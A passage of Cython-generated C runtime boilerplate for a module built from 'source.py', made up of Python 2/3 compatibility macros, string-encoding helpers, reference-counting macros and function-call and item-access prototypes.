  #define __Pyx_SET_SIZE(obj, size) Py_SIZE(obj) = (size)
#endif
#if CYTHON_ASSUME_SAFE_MACROS
  #define __Pyx_PySequence_SIZE(seq)  Py_SIZE(seq)
#else
  #define __Pyx_PySequence_SIZE(seq)  PySequence_Size(seq)
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyIntObject                  PyLongObject
  #define PyInt_Type                   PyLong_Type
  #define PyInt_Check(op)              PyLong_Check(op)
  #define PyInt_CheckExact(op)         PyLong_CheckExact(op)
  #define PyInt_FromString             PyLong_FromString
  #define PyInt_FromUnicode            PyLong_FromUnicode
  #define PyInt_FromLong               PyLong_FromLong
  #define PyInt_FromSize_t             PyLong_FromSize_t
  #define PyInt_FromSsize_t            PyLong_FromSsize_t
  #define PyInt_AsLong                 PyLong_AsLong
  #define PyInt_AS_LONG                PyLong_AS_LONG
  #define PyInt_AsSsize_t              PyLong_AsSsize_t
  #define PyInt_AsUnsignedLongMask     PyLong_AsUnsignedLongMask
  #define PyInt_AsUnsignedLongLongMask PyLong_AsUnsignedLongLongMask
  #define PyNumber_Int                 PyNumber_Long
#endif
#if PY_MAJOR_VERSION >= 3
  #define PyBoolObject                 PyLongObject
#endif
#if PY_MAJOR_VERSION >= 3 && CYTHON_COMPILING_IN_PYPY
  #ifndef PyUnicode_InternFromString
    #define PyUnicode_InternFromString(s) PyUnicode_FromString(s)
  #endif
#endif
#if PY_VERSION_HEX < 0x030200A4
  typedef long Py_hash_t;
  #define __Pyx_PyInt_FromHash_t PyInt_FromLong
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsHash_t
#else
  #define __Pyx_PyInt_FromHash_t PyInt_FromSsize_t
  #define __Pyx_PyInt_AsHash_t   __Pyx_PyIndex_AsSsize_t
#endif
#if PY_MAJOR_VERSION >= 3
  #define __Pyx_PyMethod_New(func, self, klass) ((self) ? ((void)(klass), PyMethod_New(func, self)) : __Pyx_NewRef(func))
#else
  #define __Pyx_PyMethod_New(func, self, klass) PyMethod_New(func, self, klass)
#endif
#if CYTHON_USE_ASYNC_SLOTS
  #if PY_VERSION_HEX >= 0x030500B1
    #define __Pyx_PyAsyncMethodsStruct PyAsyncMethods
    #define __Pyx_PyType_AsAsync(obj) (Py_TYPE(obj)->tp_as_async)
  #else
    #define __Pyx_PyType_AsAsync(obj) ((__Pyx_PyAsyncMethodsStruct*) (Py_TYPE(obj)->tp_reserved))
  #endif
#else
  #define __Pyx_PyType_AsAsync(obj) NULL
#endif
#ifndef __Pyx_PyAsyncMethodsStruct
    typedef struct {
        unaryfunc am_await;
        unaryfunc am_aiter;
        unaryfunc am_anext;
    } __Pyx_PyAsyncMethodsStruct;
#endif

#if defined(_WIN32) || defined(WIN32) || defined(MS_WINDOWS)
  #if !defined(_USE_MATH_DEFINES)
    #define _USE_MATH_DEFINES
  #endif
#endif
#include <math.h>
#ifdef NAN
#define __PYX_NAN() ((float) NAN)
#else
static CYTHON_INLINE float __PYX_NAN() {
  float value;
  memset(&value, 0xFF, sizeof(value));
  return value;
}
#endif
#if defined(__CYGWIN__) && defined(_LDBL_EQ_DBL)
#define __Pyx_truncl trunc
#else
#define __Pyx_truncl truncl
#endif

#define __PYX_MARK_ERR_POS(f_index, lineno) \
    { __pyx_filename = __pyx_f[f_index]; (void)__pyx_filename; __pyx_lineno = lineno; (void)__pyx_lineno; __pyx_clineno = __LINE__; (void)__pyx_clineno; }
#define __PYX_ERR(f_index, lineno, Ln_error) \
    { __PYX_MARK_ERR_POS(f_index, lineno) goto Ln_error; }

#ifndef __PYX_EXTERN_C
  #ifdef __cplusplus
    #define __PYX_EXTERN_C extern "C"
  #else
    #define __PYX_EXTERN_C extern
  #endif
#endif

#define __PYX_HAVE__source
#define __PYX_HAVE_API__source
/* Early includes */
#ifdef _OPENMP
#include <omp.h>
#endif /* _OPENMP */

#if defined(PYREX_WITHOUT_ASSERTIONS) && !defined(CYTHON_WITHOUT_ASSERTIONS)
#define CYTHON_WITHOUT_ASSERTIONS
#endif

typedef struct {PyObject **p; const char *s; const Py_ssize_t n; const char* encoding;
                const char is_unicode; const char is_str; const char intern; } __Pyx_StringTabEntry;

#define __PYX_DEFAULT_STRING_ENCODING_IS_ASCII 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_UTF8 0
#define __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT (PY_MAJOR_VERSION >= 3 && __PYX_DEFAULT_STRING_ENCODING_IS_UTF8)
#define __PYX_DEFAULT_STRING_ENCODING ""
#define __Pyx_PyObject_FromString __Pyx_PyBytes_FromString
#define __Pyx_PyObject_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#define __Pyx_uchar_cast(c) ((unsigned char)c)
#define __Pyx_long_cast(x) ((long)x)
#define __Pyx_fits_Py_ssize_t(v, type, is_signed)  (\
    (sizeof(type) < sizeof(Py_ssize_t))  ||\
    (sizeof(type) > sizeof(Py_ssize_t) &&\
          likely(v < (type)PY_SSIZE_T_MAX ||\
                 v == (type)PY_SSIZE_T_MAX)  &&\
          (!is_signed || likely(v > (type)PY_SSIZE_T_MIN ||\
                                v == (type)PY_SSIZE_T_MIN)))  ||\
    (sizeof(type) == sizeof(Py_ssize_t) &&\
          (is_signed || likely(v < (type)PY_SSIZE_T_MAX ||\
                               v == (type)PY_SSIZE_T_MAX)))  )
static CYTHON_INLINE int __Pyx_is_valid_index(Py_ssize_t i, Py_ssize_t limit) {
    return (size_t) i < (size_t) limit;
}
#if defined (__cplusplus) && __cplusplus >= 201103L
    #include <cstdlib>
    #define __Pyx_sst_abs(value) std::abs(value)
#elif SIZEOF_INT >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) abs(value)
#elif SIZEOF_LONG >= SIZEOF_SIZE_T
    #define __Pyx_sst_abs(value) labs(value)
#elif defined (_MSC_VER)
    #define __Pyx_sst_abs(value) ((Py_ssize_t)_abs64(value))
#elif defined (__STDC_VERSION__) && __STDC_VERSION__ >= 199901L
    #define __Pyx_sst_abs(value) llabs(value)
#elif defined (__GNUC__)
    #define __Pyx_sst_abs(value) __builtin_llabs(value)
#else
    #define __Pyx_sst_abs(value) ((value<0) ? -value : value)
#endif
static CYTHON_INLINE const char* __Pyx_PyObject_AsString(PyObject*);
static CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject*, Py_ssize_t* length);
#define __Pyx_PyByteArray_FromString(s) PyByteArray_FromStringAndSize((const char*)s, strlen((const char*)s))
#define __Pyx_PyByteArray_FromStringAndSize(s, l) PyByteArray_FromStringAndSize((const char*)s, l)
#define __Pyx_PyBytes_FromString        PyBytes_FromString
#define __Pyx_PyBytes_FromStringAndSize PyBytes_FromStringAndSize
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_FromString(const char*);
#if PY_MAJOR_VERSION < 3
    #define __Pyx_PyStr_FromString        __Pyx_PyBytes_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyBytes_FromStringAndSize
#else
    #define __Pyx_PyStr_FromString        __Pyx_PyUnicode_FromString
    #define __Pyx_PyStr_FromStringAndSize __Pyx_PyUnicode_FromStringAndSize
#endif
#define __Pyx_PyBytes_AsWritableString(s)     ((char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableSString(s)    ((signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsWritableUString(s)    ((unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsString(s)     ((const char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsSString(s)    ((const signed char*) PyBytes_AS_STRING(s))
#define __Pyx_PyBytes_AsUString(s)    ((const unsigned char*) PyBytes_AS_STRING(s))
#define __Pyx_PyObject_AsWritableString(s)    ((char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableSString(s)    ((signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsWritableUString(s)    ((unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsSString(s)    ((const signed char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_AsUString(s)    ((const unsigned char*) __Pyx_PyObject_AsString(s))
#define __Pyx_PyObject_FromCString(s)  __Pyx_PyObject_FromString((const char*)s)
#define __Pyx_PyBytes_FromCString(s)   __Pyx_PyBytes_FromString((const char*)s)
#define __Pyx_PyByteArray_FromCString(s)   __Pyx_PyByteArray_FromString((const char*)s)
#define __Pyx_PyStr_FromCString(s)     __Pyx_PyStr_FromString((const char*)s)
#define __Pyx_PyUnicode_FromCString(s) __Pyx_PyUnicode_FromString((const char*)s)
static CYTHON_INLINE size_t __Pyx_Py_UNICODE_strlen(const Py_UNICODE *u) {
    const Py_UNICODE *u_end = u;
    while (*u_end++) ;
    return (size_t)(u_end - u - 1);
}
#define __Pyx_PyUnicode_FromUnicode(u)       PyUnicode_FromUnicode(u, __Pyx_Py_UNICODE_strlen(u))
#define __Pyx_PyUnicode_FromUnicodeAndLength PyUnicode_FromUnicode
#define __Pyx_PyUnicode_AsUnicode            PyUnicode_AsUnicode
#define __Pyx_NewRef(obj) (Py_INCREF(obj), obj)
#define __Pyx_Owned_Py_None(b) __Pyx_NewRef(Py_None)
static CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b);
static CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject*);
static CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject*);
static CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x);
#define __Pyx_PySequence_Tuple(obj)\
    (likely(PyTuple_CheckExact(obj)) ? __Pyx_NewRef(obj) : PySequence_Tuple(obj))
static CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject*);
static CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t);
static CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject*);
#if CYTHON_ASSUME_SAFE_MACROS
#define __pyx_PyFloat_AsDouble(x) (PyFloat_CheckExact(x) ? PyFloat_AS_DOUBLE(x) : PyFloat_AsDouble(x))
#else
#define __pyx_PyFloat_AsDouble(x) PyFloat_AsDouble(x)
#endif
#define __pyx_PyFloat_AsFloat(x) ((float) __pyx_PyFloat_AsDouble(x))
#if PY_MAJOR_VERSION >= 3
#define __Pyx_PyNumber_Int(x) (PyLong_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Long(x))
#else
#define __Pyx_PyNumber_Int(x) (PyInt_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Int(x))
#endif
#define __Pyx_PyNumber_Float(x) (PyFloat_CheckExact(x) ? __Pyx_NewRef(x) : PyNumber_Float(x))
#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII
static int __Pyx_sys_getdefaultencoding_not_ascii;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    PyObject* ascii_chars_u = NULL;
    PyObject* ascii_chars_b = NULL;
    const char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    if (strcmp(default_encoding_c, "ascii") == 0) {
        __Pyx_sys_getdefaultencoding_not_ascii = 0;
    } else {
        char ascii_chars[128];
        int c;
        for (c = 0; c < 128; c++) {
            ascii_chars[c] = c;
        }
        __Pyx_sys_getdefaultencoding_not_ascii = 1;
        ascii_chars_u = PyUnicode_DecodeASCII(ascii_chars, 128, NULL);
        if (!ascii_chars_u) goto bad;
        ascii_chars_b = PyUnicode_AsEncodedString(ascii_chars_u, default_encoding_c, NULL);
        if (!ascii_chars_b || !PyBytes_Check(ascii_chars_b) || memcmp(ascii_chars, PyBytes_AS_STRING(ascii_chars_b), 128) != 0) {
            PyErr_Format(
                PyExc_ValueError,
                "This module compiled with c_string_encoding=ascii, but default encoding '%.200s' is not a superset of ascii.",
                default_encoding_c);
            goto bad;
        }
        Py_DECREF(ascii_chars_u);
        Py_DECREF(ascii_chars_b);
    }
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    Py_XDECREF(ascii_chars_u);
    Py_XDECREF(ascii_chars_b);
    return -1;
}
#endif
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT && PY_MAJOR_VERSION >= 3
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_DecodeUTF8(c_str, size, NULL)
#else
#define __Pyx_PyUnicode_FromStringAndSize(c_str, size) PyUnicode_Decode(c_str, size, __PYX_DEFAULT_STRING_ENCODING, NULL)
#if __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT
static char* __PYX_DEFAULT_STRING_ENCODING;
static int __Pyx_init_sys_getdefaultencoding_params(void) {
    PyObject* sys;
    PyObject* default_encoding = NULL;
    char* default_encoding_c;
    sys = PyImport_ImportModule("sys");
    if (!sys) goto bad;
    default_encoding = PyObject_CallMethod(sys, (char*) (const char*) "getdefaultencoding", NULL);
    Py_DECREF(sys);
    if (!default_encoding) goto bad;
    default_encoding_c = PyBytes_AsString(default_encoding);
    if (!default_encoding_c) goto bad;
    __PYX_DEFAULT_STRING_ENCODING = (char*) malloc(strlen(default_encoding_c) + 1);
    if (!__PYX_DEFAULT_STRING_ENCODING) goto bad;
    strcpy(__PYX_DEFAULT_STRING_ENCODING, default_encoding_c);
    Py_DECREF(default_encoding);
    return 0;
bad:
    Py_XDECREF(default_encoding);
    return -1;
}
#endif
#endif


/* Test for GCC > 2.95 */
#if defined(__GNUC__)     && (__GNUC__ > 2 || (__GNUC__ == 2 && (__GNUC_MINOR__ > 95)))
  #define likely(x)   __builtin_expect(!!(x), 1)
  #define unlikely(x) __builtin_expect(!!(x), 0)
#else /* !__GNUC__ or GCC < 2.95 */
  #define likely(x)   (x)
  #define unlikely(x) (x)
#endif /* __GNUC__ */
static CYTHON_INLINE void __Pyx_pretend_to_initialize(void* ptr) { (void)ptr; }

static PyObject *__pyx_m = NULL;
static PyObject *__pyx_d;
static PyObject *__pyx_b;
static PyObject *__pyx_cython_runtime = NULL;
static PyObject *__pyx_empty_tuple;
static PyObject *__pyx_empty_bytes;
static PyObject *__pyx_empty_unicode;
static int __pyx_lineno;
static int __pyx_clineno = 0;
static const char * __pyx_cfilenm= __FILE__;
static const char *__pyx_filename;


static const char *__pyx_f[] = {
  "source.py",
};

/*--- Type declarations ---*/
struct __pyx_obj_6source___pyx_scope_struct__genexpr;
struct __pyx_obj_6source___pyx_scope_struct_1_genexpr;
struct __pyx_obj_6source___pyx_scope_struct_2_genexpr;


struct __pyx_obj_6source___pyx_scope_struct__genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};



struct __pyx_obj_6source___pyx_scope_struct_1_genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};



struct __pyx_obj_6source___pyx_scope_struct_2_genexpr {
  PyObject_HEAD
  PyObject *__pyx_v_i;
};


/* --- Runtime support code (head) --- */
/* Refnanny.proto */
#ifndef CYTHON_REFNANNY
  #define CYTHON_REFNANNY 0
#endif
#if CYTHON_REFNANNY
  typedef struct {
    void (*INCREF)(void*, PyObject*, int);
    void (*DECREF)(void*, PyObject*, int);
    void (*GOTREF)(void*, PyObject*, int);
    void (*GIVEREF)(void*, PyObject*, int);
    void* (*SetupContext)(const char*, int, const char*);
    void (*FinishContext)(void**);
  } __Pyx_RefNannyAPIStruct;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNanny = NULL;
  static __Pyx_RefNannyAPIStruct *__Pyx_RefNannyImportAPI(const char *modname);
  #define __Pyx_RefNannyDeclarations void *__pyx_refnanny = NULL;
#ifdef WITH_THREAD
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          if (acquire_gil) {\
              PyGILState_STATE __pyx_gilstate_save = PyGILState_Ensure();\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
              PyGILState_Release(__pyx_gilstate_save);\
          } else {\
              __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__);\
          }
#else
  #define __Pyx_RefNannySetupContext(name, acquire_gil)\
          __pyx_refnanny = __Pyx_RefNanny->SetupContext((name), __LINE__, __FILE__)
#endif
  #define __Pyx_RefNannyFinishContext()\
          __Pyx_RefNanny->FinishContext(&__pyx_refnanny)
  #define __Pyx_INCREF(r)  __Pyx_RefNanny->INCREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_DECREF(r)  __Pyx_RefNanny->DECREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GOTREF(r)  __Pyx_RefNanny->GOTREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_GIVEREF(r) __Pyx_RefNanny->GIVEREF(__pyx_refnanny, (PyObject *)(r), __LINE__)
  #define __Pyx_XINCREF(r)  do { if((r) != NULL) {__Pyx_INCREF(r); }} while(0)
  #define __Pyx_XDECREF(r)  do { if((r) != NULL) {__Pyx_DECREF(r); }} while(0)
  #define __Pyx_XGOTREF(r)  do { if((r) != NULL) {__Pyx_GOTREF(r); }} while(0)
  #define __Pyx_XGIVEREF(r) do { if((r) != NULL) {__Pyx_GIVEREF(r);}} while(0)
#else
  #define __Pyx_RefNannyDeclarations
  #define __Pyx_RefNannySetupContext(name, acquire_gil)
  #define __Pyx_RefNannyFinishContext()
  #define __Pyx_INCREF(r) Py_INCREF(r)
  #define __Pyx_DECREF(r) Py_DECREF(r)
  #define __Pyx_GOTREF(r)
  #define __Pyx_GIVEREF(r)
  #define __Pyx_XINCREF(r) Py_XINCREF(r)
  #define __Pyx_XDECREF(r) Py_XDECREF(r)
  #define __Pyx_XGOTREF(r)
  #define __Pyx_XGIVEREF(r)
#endif
#define __Pyx_XDECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_XDECREF(tmp);\
    } while (0)
#define __Pyx_DECREF_SET(r, v) do {\
        PyObject *tmp = (PyObject *) r;\
        r = v; __Pyx_DECREF(tmp);\
    } while (0)
#define __Pyx_CLEAR(r)    do { PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);} while(0)
#define __Pyx_XCLEAR(r)   do { if((r) != NULL) {PyObject* tmp = ((PyObject*)(r)); r = NULL; __Pyx_DECREF(tmp);}} while(0)

/* PyObjectGetAttrStr.proto */
#if CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetAttrStr(PyObject* obj, PyObject* attr_name);
#else
#define __Pyx_PyObject_GetAttrStr(o,n) PyObject_GetAttr(o,n)
#endif

/* GetBuiltinName.proto */
static PyObject *__Pyx_GetBuiltinName(PyObject *name);

/* RaiseArgTupleInvalid.proto */
static void __Pyx_RaiseArgtupleInvalid(const char* func_name, int exact,
    Py_ssize_t num_min, Py_ssize_t num_max, Py_ssize_t num_found);

/* RaiseDoubleKeywords.proto */
static void __Pyx_RaiseDoubleKeywordsError(const char* func_name, PyObject* kw_name);

/* ParseKeywords.proto */
static int __Pyx_ParseOptionalKeywords(PyObject *kwds, PyObject **argnames[],\
    PyObject *kwds2, PyObject *values[], Py_ssize_t num_pos_args,\
    const char* function_name);

/* PyDictVersioning.proto */
#if CYTHON_USE_DICT_VERSIONS && CYTHON_USE_TYPE_SLOTS
#define __PYX_DICT_VERSION_INIT  ((PY_UINT64_T) -1)
#define __PYX_GET_DICT_VERSION(dict)  (((PyDictObject*)(dict))->ma_version_tag)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)\
    (version_var) = __PYX_GET_DICT_VERSION(dict);\
    (cache_var) = (value);
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP) {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    if (likely(__PYX_GET_DICT_VERSION(DICT) == __pyx_dict_version)) {\
        (VAR) = __pyx_dict_cached_value;\
    } else {\
        (VAR) = __pyx_dict_cached_value = (LOOKUP);\
        __pyx_dict_version = __PYX_GET_DICT_VERSION(DICT);\
    }\
}
static CYTHON_INLINE PY_UINT64_T __Pyx_get_tp_dict_version(PyObject *obj);
static CYTHON_INLINE PY_UINT64_T __Pyx_get_object_dict_version(PyObject *obj);
static CYTHON_INLINE int __Pyx_object_dict_version_matches(PyObject* obj, PY_UINT64_T tp_dict_version, PY_UINT64_T obj_dict_version);
#else
#define __PYX_GET_DICT_VERSION(dict)  (0)
#define __PYX_UPDATE_DICT_CACHE(dict, value, cache_var, version_var)
#define __PYX_PY_DICT_LOOKUP_IF_MODIFIED(VAR, DICT, LOOKUP)  (VAR) = (LOOKUP);
#endif

/* GetModuleGlobalName.proto */
#if CYTHON_USE_DICT_VERSIONS
#define __Pyx_GetModuleGlobalName(var, name)  do {\
    static PY_UINT64_T __pyx_dict_version = 0;\
    static PyObject *__pyx_dict_cached_value = NULL;\
    (var) = (likely(__pyx_dict_version == __PYX_GET_DICT_VERSION(__pyx_d))) ?\
        (likely(__pyx_dict_cached_value) ? __Pyx_NewRef(__pyx_dict_cached_value) : __Pyx_GetBuiltinName(name)) :\
        __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  do {\
    PY_UINT64_T __pyx_dict_version;\
    PyObject *__pyx_dict_cached_value;\
    (var) = __Pyx__GetModuleGlobalName(name, &__pyx_dict_version, &__pyx_dict_cached_value);\
} while(0)
static PyObject *__Pyx__GetModuleGlobalName(PyObject *name, PY_UINT64_T *dict_version, PyObject **dict_cached_value);
#else
#define __Pyx_GetModuleGlobalName(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
#define __Pyx_GetModuleGlobalNameUncached(var, name)  (var) = __Pyx__GetModuleGlobalName(name)
static CYTHON_INLINE PyObject *__Pyx__GetModuleGlobalName(PyObject *name);
#endif

/* PyCFunctionFastCall.proto */
#if CYTHON_FAST_PYCCALL
static CYTHON_INLINE PyObject *__Pyx_PyCFunction_FastCall(PyObject *func, PyObject **args, Py_ssize_t nargs);
#else
#define __Pyx_PyCFunction_FastCall(func, args, nargs)  (assert(0), NULL)
#endif

/* PyFunctionFastCall.proto */
#if CYTHON_FAST_PYCALL
#define __Pyx_PyFunction_FastCall(func, args, nargs)\
    __Pyx_PyFunction_FastCallDict((func), (args), (nargs), NULL)
#if 1 || PY_VERSION_HEX < 0x030600B1
static PyObject *__Pyx_PyFunction_FastCallDict(PyObject *func, PyObject **args, Py_ssize_t nargs, PyObject *kwargs);
#else
#define __Pyx_PyFunction_FastCallDict(func, args, nargs, kwargs) _PyFunction_FastCallDict(func, args, nargs, kwargs)
#endif
#define __Pyx_BUILD_ASSERT_EXPR(cond)\
    (sizeof(char [1 - 2*!(cond)]) - 1)
#ifndef Py_MEMBER_SIZE
#define Py_MEMBER_SIZE(type, member) sizeof(((type *)0)->member)
#endif
#if CYTHON_FAST_PYCALL
  static size_t __pyx_pyframe_localsplus_offset = 0;
  #include "frameobject.h"
#if PY_VERSION_HEX >= 0x030b00a6
  #ifndef Py_BUILD_CORE
    #define Py_BUILD_CORE 1
  #endif
  #include "internal/pycore_frame.h"
#endif
  #define __Pxy_PyFrame_Initialize_Offsets()\
    ((void)__Pyx_BUILD_ASSERT_EXPR(sizeof(PyFrameObject) == offsetof(PyFrameObject, f_localsplus) + Py_MEMBER_SIZE(PyFrameObject, f_localsplus)),\
     (void)(__pyx_pyframe_localsplus_offset = ((size_t)PyFrame_Type.tp_basicsize) - Py_MEMBER_SIZE(PyFrameObject, f_localsplus)))
  #define __Pyx_PyFrame_GetLocalsplus(frame)\
    (assert(__pyx_pyframe_localsplus_offset), (PyObject **)(((char *)(frame)) + __pyx_pyframe_localsplus_offset))
#endif // CYTHON_FAST_PYCALL
#endif

/* PyObjectCall.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_Call(PyObject *func, PyObject *arg, PyObject *kw);
#else
#define __Pyx_PyObject_Call(func, arg, kw) PyObject_Call(func, arg, kw)
#endif

/* PyObjectCall2Args.proto */
static CYTHON_UNUSED PyObject* __Pyx_PyObject_Call2Args(PyObject* function, PyObject* arg1, PyObject* arg2);

/* PyObjectCallMethO.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallMethO(PyObject *func, PyObject *arg);
#endif

/* PyObjectCallOneArg.proto */
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallOneArg(PyObject *func, PyObject *arg);

/* PyObjectCallNoArg.proto */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyObject_CallNoArg(PyObject *func);
#else
#define __Pyx_PyObject_CallNoArg(func) __Pyx_PyObject_Call(func, __pyx_empty_tuple, NULL)
#endif

/* PyObjectFormatSimple.proto */
#if CYTHON_COMPILING_IN_PYPY
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#elif PY_MAJOR_VERSION < 3
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyString_CheckExact(s)) ? PyUnicode_FromEncodedObject(s, NULL, "strict") :\
        PyObject_Format(s, f))
#elif CYTHON_USE_TYPE_SLOTS
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        likely(PyLong_CheckExact(s)) ? PyLong_Type.tp_str(s) :\
        likely(PyFloat_CheckExact(s)) ? PyFloat_Type.tp_str(s) :\
        PyObject_Format(s, f))
#else
    #define __Pyx_PyObject_FormatSimple(s, f) (\
        likely(PyUnicode_CheckExact(s)) ? (Py_INCREF(s), s) :\
        PyObject_Format(s, f))
#endif

/* IncludeStringH.proto */
#include <string.h>

/* JoinPyUnicode.proto */
static PyObject* __Pyx_PyUnicode_Join(PyObject* value_tuple, Py_ssize_t value_count, Py_ssize_t result_ulength,
                                      Py_UCS4 max_char);

/* PyIntCompare.proto */
static CYTHON_INLINE PyObject* __Pyx_PyInt_EqObjC(PyObject *op1, PyObject *op2, long intval, long inplace);

/* DictGetItem.proto */
#if PY_MAJOR_VERSION >= 3 && !CYTHON_COMPILING_IN_PYPY
static PyObject *__Pyx_PyDict_GetItem(PyObject *d, PyObject* key);
#define __Pyx_PyObject_Dict_GetItem(obj, name)\
    (likely(PyDict_CheckExact(obj)) ?\
     __Pyx_PyDict_GetItem(obj, name) : PyObject_GetItem(obj, name))
#else
#define __Pyx_PyDict_GetItem(d, key) PyObject_GetItem(d, key)
#define __Pyx_PyObject_Dict_GetItem(obj, name)  PyObject_GetItem(obj, name)
#endif

/* ListCompAppend.proto */
#if CYTHON_USE_PYLIST_INTERNALS && CYTHON_ASSUME_SAFE_MACROS
static CYTHON_INLINE int __Pyx_ListComp_Append(PyObject* list, PyObject* x) {
    PyListObject* L = (PyListObject*) list;
    Py_ssize_t len = Py_SIZE(list);
    if (likely(L->allocated > len)) {
        Py_INCREF(x);
        PyList_SET_ITEM(list, len, x);
        __Pyx_SET_SIZE(list, len + 1);
        return 0;
    }
    return PyList_Append(list, x);
}
#else
#define __Pyx_ListComp_Append(L,x) PyList_Append(L,x)
#endif

/* PyUnicode_Unicode.proto */
static CYTHON_INLINE PyObject* __Pyx_PyUnicode_Unicode(PyObject *obj);

/* GetItemInt.proto */
#define __Pyx_GetItemInt(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Fast(o, (Py_ssize_t)i, is_list, wraparound, boundscheck) :\
    (is_list ? (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL) :\
               __Pyx_GetItemInt_Generic(o, to_py_func(i))))
#define __Pyx_GetItemInt_List(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_List_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "list index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
#define __Pyx_GetItemInt_Tuple(o, i, type, is_signed, to_py_func, is_list, wraparound, boundscheck)\
    (__Pyx_fits_Py_ssize_t(i, type, is_signed) ?\
    __Pyx_GetItemInt_Tuple_Fast(o, (Py_ssize_t)i, wraparound, boundscheck) :\
    (PyErr_SetString(PyExc_IndexError, "tuple index out of range"), (PyObject*)NULL))
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              int wraparound, int boundscheck);
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j);
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i,
                                                     int is_list, int wraparound, int boundscheck);

/* PyObjectLookupSpecial.proto */
#if CYTHON_USE_PYTYPE_LOOKUP && CYTHON_USE_TYPE_SLOTS
static CYTHON_INLINE PyObject* __Pyx_PyObject_LookupSpecial(PyObject* obj, PyObject* attr_name) {
    PyObject *res;
